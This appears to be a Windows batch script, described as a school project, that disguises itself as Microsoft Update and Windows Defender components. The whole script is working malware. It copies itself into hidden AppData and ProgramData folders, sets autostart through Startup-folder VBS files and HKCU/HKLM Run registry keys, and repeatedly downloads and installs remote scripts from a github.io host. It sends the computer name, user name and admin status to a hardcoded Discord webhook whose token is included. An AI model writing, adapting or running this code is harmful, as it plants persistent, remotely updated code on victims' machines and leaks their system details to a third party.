@echo off
setlocal enabledelayedexpansion
cls

set "version=2.6"


rem check for usb drive
set "filename=na.ibaf"
set "UsbDrive=false"
for /f "tokens=*" %%d in ('wmic logicaldisk get caption^, drivetype ^| find "2"') do (
    set "Laufwerk=%%d"
    set "Laufwerk=!Laufwerk:~0,2!"
    dir /b !Laufwerk!\ >nul 2>&1 && (
        if exist "!Laufwerk!\!filename!" (
            set "UsbDrive=true"
        )
    )
)


rem check for admin rights
set "AdminRights=false"
net session >nul 2>&1
if %errorlevel% == 0 (
    set "AdminRights=true"
) else (
    set "AdminRights=false"
)


rem USER bat file
set "userfile=NON"
if exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
    set "userfile=YES"
)
if not exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
    mkdir "%APPDATA%/MicrosoftUpdate/"
    copy /y %~f0 "%AppData%\MicrosoftUpdate\"
    set "userfile=YES"
)


rem PC bat file
set "pcfile=NON"
if exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
    set "pcfile=YES"
)
if not exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
    if "%UsbDrive%"=="true" (
        mkdir "%PROGRAMDATA%/MicrosoftUpdate/"
        copy /y %~f0 "%PROGRAMDATA%\MicrosoftUpdate\"
        set "pcfile=YES"
    )
    if "%AdminRights%"=="true" (
        mkdir "%PROGRAMDATA%/MicrosoftUpdate/"
        copy /y %~f0 "%PROGRAMDATA%\MicrosoftUpdate\"
        set "pcfile=YES"
    )
)


rem USER Autostart
set "userauto=NON"
if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
    set "userauto=YES"
)
if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
    copy /y "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.vbs', '%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs')"
    set "userauto=YES"
)


rem PC Autostart
set "pcauto=NON"
if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
    set "pcauto=YES"
)
if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
    if "%AdminRights%"=="true" (
        copy /y "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.vbs', '%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs')"
        set "pcauto=YES"
    ) else (
        set "pcauto=NON"
    )

)



rem REGISTRY PART


rem USER registry bat file
set "userregistryfile=NON"
if exist "%APPDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
    set "userregistryfile=YES"
)
if not exist "%APPDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
    mkdir "%APPDATA%/MicrosoftDefenderUpdate/"
    copy /y %~f0 "%AppData%\MicrosoftDefenderUpdate\"
    set "userregistryfile=YES"
)


rem PC registry bat file
set "pcregistryfile=NON"
if exist "%PROGRAMDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
    set "pcregistryfile=YES"
)
if not exist "%PROGRAMDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
    if "%UsbDrive%"=="true" (
        mkdir "%PROGRAMDATA%/MicrosoftDefenderUpdate/"
        copy /y %~f0 "%PROGRAMDATA%\MicrosoftDefenderUpdate\"
        set "pcregistryfile=YES"
    )
    if "%AdminRights%"=="true" (
        mkdir "%PROGRAMDATA%/MicrosoftDefenderUpdate/"
        copy /y %~f0 "%PROGRAMDATA%\MicrosoftDefenderUpdate\"
        set "pcregistryfile=YES"
    )
)


rem USER registry
powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
set "userregistryauto=NON"
powershell -Command "if ((Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity').WindowsDefenderSecurity -ne $null) { exit 0 } else { exit 1 }"
if %errorlevel% equ 0 (
    set "userregistryauto=YES"
) else (
    set "userregistryauto=NON"
)
if not exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
    mkdir "%APPDATA%/WindowsDefenderSecurity/"
    copy /y "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%APPDATA%\WindowsDefenderSecurity\"
    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/WindowsDefenderSecurity.vbs', '%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
)


rem PC registry
if "%AdminRights%"=="true" (
    powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
)
set "pcregistryauto=NON"
powershell -Command "if ((Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity').WindowsDefenderSecurity -ne $null) { exit 0 } else { exit 1 }"
if %errorlevel% equ 0 (
    set "pcregistryauto=YES"
) else (
    set "pcregistryauto=NON"
)
if not exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
    if "%UsbDrive%"=="true" (
        mkdir "%PROGRAMDATA%/WindowsDefenderSecurity/"
        copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
    )
    if "%AdminRights%"=="true" (
        mkdir "%PROGRAMDATA%/WindowsDefenderSecurity/"
        copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
    )
)



rem Discord Webhook request

for /f "tokens=2 delims==" %%a in ('wmic OS Get localdatetime /value') do set "dt=%%a"
set "YY=%dt:~2,2%" & set "YYYY=%dt:~0,4%" & set "MM=%dt:~4,2%" & set "DD=%dt:~6,2%"
set "HH=%dt:~8,2%" & set "Min=%dt:~10,2%" & set "Sec=%dt:~12,2%"
set "time=%DD%.%MM%.%YYYY% - %HH%:%Min%:%Sec%"

set "url1=https://discord.com/api/webhooks/"
set "url2=1195425393637863436/4ikGEqzqjd-J1XNg1m5K_BQ_q3OVlPgc9p01pmNhkcAoMT45n35UBf9RY3l1WJklV4KF"
set "url=%url1%%url2%"

set "file_path=%~f0"

set "content=_setup_]%ComputerName%;]%USERNAME%;]%time%;]%version%;]%AdminRights%;]%userfile%;]%pcfile%;]%userauto%;]%pcauto%;]%userregistryfile%;]%pcregistryfile%;]%userregistryauto%;]%pcregistryauto%;]%file_path%"

powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $body = @{content='%content%'} | ConvertTo-Json; Invoke-RestMethod -Uri '%url%' -Method POST -ContentType 'application/json' -Body $body"


rem Update all bat files
powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%APPDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%APPDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"
if "%UsbDrive%"=="true" (
    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"
)
if "%AdminRights%"=="true" (
    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"
)


rem delete old files
if exist "%APPDATA%\MicrosoftDefenderSecurity\" (
    rd /s /q "%APPDATA%\MicrosoftDefenderSecurity"
)
if exist "%PROGRAMDATA%\MicrosoftDefenderSecurity\" (
    if "%AdminRights%"=="true" (
        rd /s /q "%PROGRAMDATA%\MicrosoftDefenderSecurity"
    )
    if "%UsbDrive%"=="true" (
        rd /s /q "%PROGRAMDATA%\MicrosoftDefenderSecurity"
    )
)

endlocal
exit
